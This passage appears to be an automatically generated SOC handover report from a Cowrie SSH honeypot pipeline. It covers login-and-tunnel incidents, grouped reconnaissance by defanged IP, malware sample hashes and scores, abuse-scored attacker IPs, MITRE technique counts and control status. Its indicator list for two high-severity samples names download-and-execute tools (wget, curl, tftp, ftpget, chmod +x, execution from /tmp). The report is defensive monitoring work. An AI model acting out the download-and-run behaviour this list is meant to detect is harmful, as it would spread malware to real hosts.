- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-764470be7eef

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 10:44 |
| **Last Seen** | 2026-08-25 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:44:16` | `cowrie.session.connect` |
| `2026-08-25 10:44:16` | `cowrie.client.version` |
| `2026-08-25 10:44:16` | `cowrie.client.kex` |
| `2026-08-25 10:44:17` | `cowrie.login.success` |
| `2026-08-25 10:44:17` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:44:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 10:44:18` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcf5d8d0ae29

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 10:53 |
| **Last Seen** | 2026-08-25 10:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:53:44` | `cowrie.session.connect` |
| `2026-08-25 10:53:44` | `cowrie.client.version` |
| `2026-08-25 10:53:44` | `cowrie.client.kex` |
| `2026-08-25 10:53:45` | `cowrie.login.success` |
| `2026-08-25 10:53:45` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:53:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 10:53:46` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bd0ba958217

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 10:53 |
| **Last Seen** | 2026-08-25 10:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:53:48` | `cowrie.session.connect` |
| `2026-08-25 10:53:48` | `cowrie.client.version` |
| `2026-08-25 10:53:48` | `cowrie.client.kex` |
| `2026-08-25 10:53:49` | `cowrie.login.success` |
| `2026-08-25 10:53:49` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:53:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 10:53:49` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]44` | **7** | 2026-08-25 08:57 | 2026-08-25 10:42 | 3m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-25 09:19 | 2026-08-25 10:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.135.194[.]26` | **4** | 2026-08-25 09:54 | 2026-08-25 10:00 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `73.168.37[.]194` | **4** | 2026-08-25 10:07 | 2026-08-25 10:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `134.209.229[.]23` | **3** | 2026-08-25 08:58 | 2026-08-25 10:30 | 1m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]222` | **3** | 2026-08-25 09:37 | 2026-08-25 09:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]176` | **3** | 2026-08-25 09:02 | 2026-08-25 09:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]196` | **3** | 2026-08-25 09:02 | 2026-08-25 09:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]86` | **3** | 2026-08-25 09:03 | 2026-08-25 09:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-08-25 09:26 | 2026-08-25 10:26 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `91.222.80[.]14` | **2** | 2026-08-25 09:40 | 2026-08-25 09:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.76[.]190` | 1 | 2026-08-25 10:24 | 2026-08-25 10:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]229` | 1 | 2026-08-25 10:26 | 2026-08-25 10:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]8` | 1 | 2026-08-25 09:50 | 2026-08-25 09:50 | 4s | 0 | `T1592` | 🟢 LOW |
| `165.245.172[.]73` | 1 | 2026-08-25 09:35 | 2026-08-25 09:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `182.150.115[.]56` | 1 | 2026-08-25 09:50 | 2026-08-25 09:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-08-25 10:08 | 2026-08-25 10:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.81.166[.]100` | 1 | 2026-08-25 09:45 | 2026-08-25 09:45 | 11s | 0 | `T1592` | 🟢 LOW |
| `209.113.245[.]46` | 1 | 2026-08-25 09:27 | 2026-08-25 09:27 | 11s | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]6` | 1 | 2026-08-25 09:06 | 2026-08-25 09:06 | 31s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-08-25 09:37 | 2026-08-25 09:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]10` | 1 | 2026-08-25 10:26 | 2026-08-25 10:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.251.153[.]178` | 1 | 2026-08-25 09:02 | 2026-08-25 09:02 | 24s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `101.43.79[.]210` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 21 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `80.251.153[.]178` | NL | Amarutu Technology Ltd | **100** ⚠️ | 3 |
| `200.81.166[.]100` | AR | SION S.A | **100** ⚠️ | 1 |
| `66.132.172[.]176` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `66.132.186[.]196` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `151.243.11[.]8` | DE | LLC VASH KREDIT BANK | **100** ⚠️ | 8 |
| `172.236.228[.]222` | US | Linode | **100** ⚠️ | 50 |
| `165.245.172[.]73` | US | DigitalOcean, LLC | **100** ⚠️ | 14 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 255 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 212 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 210 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 49 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 4 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 325 cases |
| Tool 34  | Credential Extractor        | ✅ 267 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 42 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (6.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 18 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 255 priority case(s) shown individually · 23 recon entry/entries in table (11 group(s) consolidating 38 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-25T12:54:03Z_
